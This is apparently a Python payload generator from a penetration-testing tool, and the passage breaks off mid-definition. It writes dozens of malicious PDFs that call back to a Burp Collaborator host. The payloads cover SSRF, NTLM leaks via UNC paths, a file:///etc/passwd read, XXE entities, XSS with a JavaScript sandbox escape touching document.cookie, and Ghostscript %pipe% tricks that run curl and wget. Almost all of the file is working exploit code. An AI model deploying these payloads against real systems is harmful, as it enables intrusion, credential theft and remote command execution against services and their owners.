from pathlib import Path
import base64
import subprocess
import os

try:
    from .ssti_filename_generator import generate_ssti_filename_payloads
    from .xss_filename_generator import generate_xss_filename_payloads
except ImportError:
    try:
        from ssti_filename_generator import generate_ssti_filename_payloads
        from xss_filename_generator import generate_xss_filename_payloads
    except ImportError:
        generate_ssti_filename_payloads = None
        generate_xss_filename_payloads = None

def generate_pdf_payloads(output_dir, burp_collab, tech_filter='all', payload_types=None):
    if payload_types is None:
        payload_types = {'all'}
    
    def should_generate_type(payload_type):
        return 'all' in payload_types or payload_type in payload_types
    output_dir = Path(output_dir)
    output_dir.mkdir(parents=True, exist_ok=True)
    
    base_url = f"http://{burp_collab}"
    
    vulns = {
        'ssrf': [],
        'ntlm': [],
        'lfi': [],
        'xxe': [],
        'rce': [],
        'xss': [],
    }
    
    if should_generate_type('ssrf'):
        ssrf_dir = output_dir / 'ssrf'
        ssrf_dir.mkdir(exist_ok=True)
    if should_generate_type('ntlm'):
        ntlm_dir = output_dir / 'ntlm'
        ntlm_dir.mkdir(exist_ok=True)
    if should_generate_type('lfi'):
        lfi_dir = output_dir / 'lfi'
        lfi_dir.mkdir(exist_ok=True)
    if should_generate_type('xxe'):
        xxe_dir = output_dir / 'xxe'
        xxe_dir.mkdir(exist_ok=True)
    if should_generate_type('rce') or should_generate_type('deserialization'):
        rce_dir = output_dir / 'rce'
        rce_dir.mkdir(exist_ok=True)
    if should_generate_type('xss'):
        xss_dir = output_dir / 'xss'
        xss_dir.mkdir(exist_ok=True)
    if should_generate_type('info') or should_generate_type('info_leak'):
        info_dir = output_dir / 'info'
        info_dir.mkdir(exist_ok=True)
    
    pdf_header = b'%PDF-1.4\n'
    pdf_trailer = b'\n%%EOF'
    
    pdf_ssrf1_xobject_image = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Resources <<
/XObject <<
/Img1 4 0 R
>>
>>
/Contents 5 0 R
>>
endobj
4 0 obj
<<
/Type /XObject
/Subtype /Image
/Width 100
/Height 100
/ColorSpace /DeviceRGB
/BitsPerComponent 8
/URI ({base_url}/img1)
>>
stream
endstream
endobj
5 0 obj
<<
/Length 0
>>
stream
endstream
endobj
xref
0 6
trailer
<<
/Size 6
/Root 1 0 R
>>
startxref
0
%%EOF'''
    if should_generate_type('ssrf'):
        with open(ssrf_dir / "ssrf1_xobject_image.pdf", 'wb') as f:
            f.write(pdf_ssrf1_xobject_image.encode())
    
    pdf_ssrf2_fontfile = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Resources <<
/Font <<
/F1 4 0 R
>>
>>
/Contents 5 0 R
>>
endobj
4 0 obj
<<
/Type /Font
/Subtype /Type1
/BaseFont /Helvetica
/FontFile2 <<
/URI ({base_url}/font.ttf)
>>
>>
endobj
5 0 obj
<<
/Length 0
>>
stream
endstream
endobj
xref
0 6
trailer
<<
/Size 6
/Root 1 0 R
>>
startxref
0
%%EOF'''
    if should_generate_type('ssrf'):
        with open(ssrf_dir / "ssrf2_fontfile.pdf", 'wb') as f:
            f.write(pdf_ssrf2_fontfile.encode())
    
    pdf_ssrf3_annot_uri = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Annots [4 0 R]
>>
endobj
4 0 obj
<<
/Type /Annot
/Subtype /Link
/Rect [100 100 200 200]
/A <<
/S /URI
/URI ({base_url}/link1)
>>
>>
endobj
xref
0 5
trailer
<<
/Size 5
/Root 1 0 R
>>
startxref
0
%%EOF'''
    if should_generate_type('ssrf'):
        with open(ssrf_dir / "ssrf3_annot_uri.pdf", 'wb') as f:
            f.write(pdf_ssrf3_annot_uri.encode())
    
    pdf_ssrf4_gotor = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/OpenAction 3 0 R
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [4 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Action
/S /GoToR
/F ({base_url}/remote.pdf)
/D [0 /Fit]
>>
endobj
4 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
>>
endobj
xref
0 5
trailer
<<
/Size 5
/Root 1 0 R
>>
startxref
0
%%EOF'''
    if should_generate_type('ssrf'):
        with open(ssrf_dir / "ssrf4_gotor.pdf", 'wb') as f:
            f.write(pdf_ssrf4_gotor.encode())
    
    pdf_ssrf5_xmp = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/Metadata 3 0 R
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [4 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Metadata
/Subtype /XML
/Length 200
>>
stream
<?xpacket begin="\ufeff" id="W5M0MpCehiHzreSzNTczkc9d"?>
<x:xmpmeta xmlns:x="adobe:ns:meta/">
<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">
<rdf:Description rdf:about="" xmlns:xmpMM="http://ns.adobe.com/xap/1.0/mm/">
<xmpMM:DocumentID>{base_url}/xmp</xmpMM:DocumentID>
</rdf:Description>
</rdf:RDF>
</x:xmpmeta>
<?xpacket end="w"?>
endstream
endobj
4 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
>>
endobj
xref
0 5
trailer
<<
/Size 5
/Root 1 0 R
>>
startxref
0
%%EOF'''
    if should_generate_type('ssrf'):
        with open(ssrf_dir / "ssrf5_xmp.pdf", 'wb') as f:
            f.write(pdf_ssrf5_xmp.encode())
    
    pdf_ssrf6_icc = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Resources <<
/ColorSpace <<
/CS1 4 0 R
>>
>>
>>
endobj
4 0 obj
<<
/N 3
/Alternate /DeviceRGB
/Filter /FlateDecode
/Length 0
/URI ({base_url}/evil.icc)
>>
endobj
xref
0 5
trailer
<<
/Size 5
/Root 1 0 R
>>
startxref
0
%%EOF'''
    if should_generate_type('ssrf'):
        with open(ssrf_dir / "ssrf6_icc.pdf", 'wb') as f:
            f.write(pdf_ssrf6_icc.encode())
    
    pdf_ssrf7_embedded = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/Names <<
/EmbeddedFiles <<
/Names [(evil.zip) 3 0 R]
>>
>>
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [4 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /FileSpec
/F (evil.zip)
/EF <<
/F 5 0 R
>>
>>
endobj
4 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
>>
endobj
5 0 obj
<<
/Type /EmbeddedFile
/Length 0
/F <<
/URI ({base_url}/evil.zip)
>>
>>
endobj
xref
0 6
trailer
<<
/Size 6
/Root 1 0 R
>>
startxref
0
%%EOF'''
    if should_generate_type('ssrf'):
        with open(ssrf_dir / "ssrf7_embedded.pdf", 'wb') as f:
            f.write(pdf_ssrf7_embedded.encode())
    
    pdf_ssrf8_xfa = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/AcroForm <<
/XFA 3 0 R
>>
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [4 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Length 200
>>
stream
<?xml version="1.0"?>
<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/">
<template>
<image href="{base_url}/xfa-img"/>
</template>
</xdp:xdp>
endstream
endobj
4 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
>>
endobj
xref
0 5
trailer
<<
/Size 5
/Root 1 0 R
>>
startxref
0
%%EOF'''
    if should_generate_type('ssrf'):
        with open(ssrf_dir / "ssrf8_xfa.pdf", 'wb') as f:
            f.write(pdf_ssrf8_xfa.encode())
    
    pdf_ssrf9_js_import = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/Names <<
/JavaScript <<
/Names [(test) 3 0 R]
>>
>>
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [4 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/S /JavaScript
/JS (this.importDataObject("pwn","{base_url}/file");)
>>
endobj
4 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
>>
endobj
xref
0 5
trailer
<<
/Size 5
/Root 1 0 R
>>
startxref
0
%%EOF'''
    if should_generate_type('ssrf'):
        with open(ssrf_dir / "ssrf9_js_import.pdf", 'wb') as f:
            f.write(pdf_ssrf9_js_import.encode())
    
    pdf_ssrf10_launch = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Annots [4 0 R]
>>
endobj
4 0 obj
<<
/Type /Annot
/Subtype /Link
/Rect [100 100 200 200]
/A <<
/S /Launch
/F <<
/URI ({base_url}/evil.exe)
>>
>>
>>
endobj
xref
0 5
trailer
<<
/Size 5
/Root 1 0 R
>>
startxref
0
%%EOF'''
    if should_generate_type('ssrf'):
        with open(ssrf_dir / "ssrf10_launch.pdf", 'wb') as f:
            f.write(pdf_ssrf10_launch.encode())
    
    pdf_ssrf11_iframe = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/OpenAction <<
/S /JavaScript
/JS (app.alert("Loading iframe"); var html = '<iframe src="{base_url}/iframe"></iframe>'; this.getField("test").value = html;)
>>
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
>>
endobj
xref
0 4
trailer
<<
/Size 4
/Root 1 0 R
>>
startxref
0
%%EOF'''
    if should_generate_type('ssrf'):
        with open(ssrf_dir / "ssrf11_iframe.pdf", 'wb') as f:
            f.write(pdf_ssrf11_iframe.encode())
    
    pdf_ssrf12_xhr = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/OpenAction <<
/S /JavaScript
/JS (var x=new XMLHttpRequest();x.onload=(()=>app.alert(this.responseText));x.open('GET','{base_url}/xhr');x.send();)
>>
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
>>
endobj
xref
0 4
trailer
<<
/Size 4
/Root 1 0 R
>>
startxref
0
%%EOF'''
    if should_generate_type('ssrf'):
        with open(ssrf_dir / "ssrf12_xhr.pdf", 'wb') as f:
            f.write(pdf_ssrf12_xhr.encode())
    
    pdf_ssrf13_fetch = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/OpenAction <<
/S /JavaScript
/JS (fetch('{base_url}/fetch').then(async r=>app.alert(await r.text()));)
>>
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
>>
endobj
xref
0 4
trailer
<<
/Size 4
/Root 1 0 R
>>
startxref
0
%%EOF'''
    if should_generate_type('ssrf'):
        with open(ssrf_dir / "ssrf13_fetch.pdf", 'wb') as f:
            f.write(pdf_ssrf13_fetch.encode())
    
    pdf_ssrf14_embed = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/OpenAction <<
/S /JavaScript
/JS (app.alert("Loading embed"); var html = '<embed src="{base_url}/embed" />'; this.getField("test").value = html;)
>>
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
>>
endobj
xref
0 4
trailer
<<
/Size 4
/Root 1 0 R
>>
startxref
0
%%EOF'''
    if should_generate_type('ssrf'):
        with open(ssrf_dir / "ssrf14_embed.pdf", 'wb') as f:
            f.write(pdf_ssrf14_embed.encode())
    
    pdf_ssrf15_base = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/OpenAction <<
/S /JavaScript
/JS (app.alert("Loading base"); var html = '<base href="{base_url}/base" />'; this.getField("test").value = html;)
>>
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
>>
endobj
xref
0 4
trailer
<<
/Size 4
/Root 1 0 R
>>
startxref
0
%%EOF'''
    if should_generate_type('ssrf'):
        with open(ssrf_dir / "ssrf15_base.pdf", 'wb') as f:
            f.write(pdf_ssrf15_base.encode())
    
    pdf_ssrf16_link = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/OpenAction <<
/S /JavaScript
/JS (app.alert("Loading link"); var html = '<link rel="stylesheet" src="{base_url}/link" />'; this.getField("test").value = html;)
>>
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
>>
endobj
xref
0 4
trailer
<<
/Size 4
/Root 1 0 R
>>
startxref
0
%%EOF'''
    if should_generate_type('ssrf'):
        with open(ssrf_dir / "ssrf16_link.pdf", 'wb') as f:
            f.write(pdf_ssrf16_link.encode())
    
    pdf_ssrf17_script = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/OpenAction <<
/S /JavaScript
/JS (app.alert("Loading script"); var html = '<script src="{base_url}/script"></script>'; this.getField("test").value = html;)
>>
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
>>
endobj
xref
0 4
trailer
<<
/Size 4
/Root 1 0 R
>>
startxref
0
%%EOF'''
    if should_generate_type('ssrf'):
        with open(ssrf_dir / "ssrf17_script.pdf", 'wb') as f:
            f.write(pdf_ssrf17_script.encode())
    
    pdf_ssrf18_meta = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/OpenAction <<
/S /JavaScript
/JS (app.alert("Loading meta"); var html = '<meta http-equiv="refresh" content="0; url={base_url}/meta/" />'; this.getField("test").value = html;)
>>
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
>>
endobj
xref
0 4
trailer
<<
/Size 4
/Root 1 0 R
>>
startxref
0
%%EOF'''
    if should_generate_type('ssrf'):
        with open(ssrf_dir / "ssrf18_meta.pdf", 'wb') as f:
            f.write(pdf_ssrf18_meta.encode())
    
    pdf_ssrf19_img = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/OpenAction <<
/S /JavaScript
/JS (app.alert("Loading img"); var html = '<img src="{base_url}/img" />'; this.getField("test").value = html;)
>>
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
>>
endobj
xref
0 4
trailer
<<
/Size 4
/Root 1 0 R
>>
startxref
0
%%EOF'''
    if should_generate_type('ssrf'):
        with open(ssrf_dir / "ssrf19_img.pdf", 'wb') as f:
            f.write(pdf_ssrf19_img.encode())
    
    pdf_ssrf20_svg = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/OpenAction <<
/S /JavaScript
/JS (app.alert("Loading svg"); var html = '<svg src="{base_url}/svg" />'; this.getField("test").value = html;)
>>
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
>>
endobj
xref
0 4
trailer
<<
/Size 4
/Root 1 0 R
>>
startxref
0
%%EOF'''
    if should_generate_type('ssrf'):
        with open(ssrf_dir / "ssrf20_svg.pdf", 'wb') as f:
            f.write(pdf_ssrf20_svg.encode())
    
    pdf_ssrf21_input = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/OpenAction <<
/S /JavaScript
/JS (app.alert("Loading input"); var html = '<input type="image" src="{base_url}/input" />'; this.getField("test").value = html;)
>>
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
>>
endobj
xref
0 4
trailer
<<
/Size 4
/Root 1 0 R
>>
startxref
0
%%EOF'''
    if should_generate_type('ssrf'):
        with open(ssrf_dir / "ssrf21_input.pdf", 'wb') as f:
            f.write(pdf_ssrf21_input.encode())
    
    pdf_ssrf22_video = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/OpenAction <<
/S /JavaScript
/JS (app.alert("Loading video"); var html = '<video src="{base_url}/video" />'; this.getField("test").value = html;)
>>
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
>>
endobj
xref
0 4
trailer
<<
/Size 4
/Root 1 0 R
>>
startxref
0
%%EOF'''
    if should_generate_type('ssrf'):
        with open(ssrf_dir / "ssrf22_video.pdf", 'wb') as f:
            f.write(pdf_ssrf22_video.encode())
    
    pdf_ssrf23_audio = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/OpenAction <<
/S /JavaScript
/JS (app.alert("Loading audio"); var html = '<audio src="{base_url}/audio" />'; this.getField("test").value = html;)
>>
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
>>
endobj
xref
0 4
trailer
<<
/Size 4
/Root 1 0 R
>>
startxref
0
%%EOF'''
    if should_generate_type('ssrf'):
        with open(ssrf_dir / "ssrf23_audio.pdf", 'wb') as f:
            f.write(pdf_ssrf23_audio.encode())
    
    pdf_ssrf24_audio_source = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/OpenAction <<
/S /JavaScript
/JS (app.alert("Loading audio source"); var html = '<audio><source src="{base_url}/audio-source"/></audio>'; this.getField("test").value = html;)
>>
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
>>
endobj
xref
0 4
trailer
<<
/Size 4
/Root 1 0 R
>>
startxref
0
%%EOF'''
    if should_generate_type('ssrf'):
        with open(ssrf_dir / "ssrf24_audio_source.pdf", 'wb') as f:
            f.write(pdf_ssrf24_audio_source.encode())
    
    pdf_ntlm11_xobject_unc = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Resources <<
/XObject <<
/Img1 4 0 R
>>
>>
/Contents 5 0 R
>>
endobj
4 0 obj
<<
/Type /XObject
/Subtype /Image
/Width 100
/Height 100
/ColorSpace /DeviceRGB
/BitsPerComponent 8
/URI (\\\\{burp_collab}\\pwn.png)
>>
stream
endstream
endobj
5 0 obj
<<
/Length 0
>>
stream
endstream
endobj
xref
0 6
trailer
<<
/Size 6
/Root 1 0 R
>>
startxref
0
%%EOF'''
    if should_generate_type('ntlm'):
        with open(ntlm_dir / "ntlm11_xobject_unc.pdf", 'wb') as f:
            f.write(pdf_ntlm11_xobject_unc.encode())
    
    pdf_ntlm12_font_unc = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Resources <<
/Font <<
/F1 4 0 R
>>
>>
/Contents 5 0 R
>>
endobj
4 0 obj
<<
/Type /Font
/Subtype /Type1
/BaseFont /Helvetica
/FontFile2 <<
/URI (\\\\{burp_collab}\\font.ttf)
>>
>>
endobj
5 0 obj
<<
/Length 0
>>
stream
endstream
endobj
xref
0 6
trailer
<<
/Size 6
/Root 1 0 R
>>
startxref
0
%%EOF'''
    if should_generate_type('ntlm'):
        with open(ntlm_dir / "ntlm12_font_unc.pdf", 'wb') as f:
            f.write(pdf_ntlm12_font_unc.encode())
    
    pdf_lfi13_gotor_file = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/OpenAction 3 0 R
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [4 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Action
/S /GoToR
/F (file:///etc/passwd)
/D [0 /Fit]
>>
endobj
4 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
>>
endobj
xref
0 5
trailer
<<
/Size 5
/Root 1 0 R
>>
startxref
0
%%EOF'''
    if should_generate_type('lfi'):
        with open(lfi_dir / "lfi13_gotor_file.pdf", 'wb') as f:
            f.write(pdf_lfi13_gotor_file.encode())
    
    pdf_xxe14_xmp = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/Metadata 3 0 R
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [4 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Metadata
/Subtype /XML
/Length 300
>>
stream
<?xpacket begin="\ufeff" id="W5M0MpCehiHzreSzNTczkc9d"?>
<!DOCTYPE x [<!ENTITY % x SYSTEM "{base_url}/xxe-xmp">%x;]>
<x:xmpmeta xmlns:x="adobe:ns:meta/">
<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">
<rdf:Description rdf:about="" xmlns:xmp="http://ns.adobe.com/xap/1.0/">
<xmp:CreatorTool>Test</xmp:CreatorTool>
</rdf:Description>
</rdf:RDF>
</x:xmpmeta>
<?xpacket end="w"?>
endstream
endobj
4 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
>>
endobj
xref
0 5
trailer
<<
/Size 5
/Root 1 0 R
>>
startxref
0
%%EOF'''
    if should_generate_type('xxe'):
        with open(xxe_dir / "xxe14_xmp.pdf", 'wb') as f:
            f.write(pdf_xxe14_xmp.encode())
    
    pdf_xxe15_xfa = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/AcroForm <<
/XFA 3 0 R
>>
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [4 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Length 300
>>
stream
<?xml version="1.0"?>
<!DOCTYPE x [<!ENTITY % x SYSTEM "{base_url}/xfa-xxe">%x;]>
<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/">
<template>
<field name="test">Test</field>
</template>
</xdp:xdp>
endstream
endobj
4 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
>>
endobj
xref
0 5
trailer
<<
/Size 5
/Root 1 0 R
>>
startxref
0
%%EOF'''
    if should_generate_type('xxe'):
        with open(xxe_dir / "xxe15_xfa.pdf", 'wb') as f:
            f.write(pdf_xxe15_xfa.encode())
    
    pdf_rce1_ghostscript = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Contents 4 0 R
>>
endobj
4 0 obj
<<
/Length 200
/Filter /FlateDecode
>>
stream
%!PS-Adobe-3.0
userdict /setpagedevice undef
save
legal
{{
    null restore
    stopped {{
        pop
    }} if
    (legal)
}} stopped
{{
    (legal\\) {{
        pop
        legal
    }} stopped
    {{
        restore
    }} ifelse
}} ifelse
mark /OutputFile (%pipe%curl {base_url}/rce-ghostscript) currentdevice putdeviceprops
endstream
endobj
xref
0 5
trailer
<<
/Size 5
/Root 1 0 R
>>
startxref
0
%%EOF'''
    if should_generate_type('rce'):
        with open(rce_dir / "rce1_ghostscript.pdf", 'wb') as f:
            f.write(pdf_rce1_ghostscript.encode())
    
    pdf_rce2_postscript = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Contents 4 0 R
>>
endobj
4 0 obj
<<
/Length 150
/Filter /FlateDecode
>>
stream
%!PS-Adobe-3.0
/OutputFile (%pipe%wget {base_url}/rce-postscript) (w) file
endstream
endobj
xref
0 5
trailer
<<
/Size 5
/Root 1 0 R
>>
startxref
0
%%EOF'''
    if should_generate_type('rce'):
        with open(rce_dir / "rce2_postscript.pdf", 'wb') as f:
            f.write(pdf_rce2_postscript.encode())
    
    pdf_xss1_js_sandbox_bypass = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/Names <<
/JavaScript <<
/Names [(test) 3 0 R]
>>
>>
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [4 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/S /JavaScript
/JS (app.alert\\(1\\); Object.getPrototypeOf(function*(){{}}).constructor = null; ((function*(){{}}).constructor("document.write('<script>confirm(document.cookie);</script><iframe src={base_url}/xss1>');"))().next();)
>>
endobj
4 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
>>
endobj
xref
0 5
trailer
<<
/Size 5
/Root 1 0 R
>>
startxref
0
%%EOF'''
    if should_generate_type('xss'):
        with open(xss_dir / "xss1_js_sandbox_bypass.pdf", 'wb') as f:
            f.write(pdf_xss1_js_sandbox_bypass.encode())
    
    pdf_xss2_data_uri = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Annots [4 0 R]
>>
endobj
4 0 obj
<<
/Type /Annot
/Subtype /Link
/Rect [100 100 200 200]
/A <<
/S /URI
/URI (data:text/html,<script>alert\\(2\\);fetch('{base_url}/xss2');</script>)
>>
>>
endobj
xref
0 5
trailer
<<
/Size 5
/Root 1 0 R
>>
startxref
0
%%EOF'''
    if should_generate_type('xss'):
        with open(xss_dir / "xss2_data_uri.pdf", 'wb') as f:
            f.write(pdf_xss2_data_uri.encode())
    
    pdf_xss3_annotation_injection = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Annots [4 0 R]
>>
endobj
4 0 obj
<<
/Type /Annot
/Rect [284.7745656638 581.6814031126 308.7745656638 605.6814031126]
/Subtype /Text
/M (D:20210402013803+02'00)
/C [1 1 0]
/T (\\">'><details open ontoggle=confirm\\(3\\);fetch('{base_url}/xss3');>)
/P 3 0 R
/Contents (\\">'><details open ontoggle=confirm('XSS');>)
>>
endobj
xref
0 5
trailer
<<
/Size 5
/Root 1 0 R
>>
startxref
0
%%EOF'''
    if should_generate_type('xss'):
        with open(xss_dir / "xss3_annotation_injection.pdf", 'wb') as f:
            f.write(pdf_xss3_annotation_injection.encode())
    
    pdf_xss4_uri_details = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Annots [4 0 R]
>>
endobj
4 0 obj
<<
/Type /Annot
/Subtype /Link
/Rect [100 100 200 200]
/A <<
/S /URI
/URI (\\">'><details open ontoggle=confirm\\(2\\);fetch('{base_url}/xss4');>)
>>
>>
endobj
xref
0 5
trailer
<<
/Size 5
/Root 1 0 R
>>
startxref
0
%%EOF'''
    if should_generate_type('xss'):
        with open(xss_dir / "xss4_uri_details.pdf", 'wb') as f:
            f.write(pdf_xss4_uri_details.encode())
    
    pdf_xss5_js_bypass_apis = f'''%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/Names <<
/JavaScript <<
/Names [(test) 3 0 R]
>>
>>
>>
endobj
2 0 obj
<<
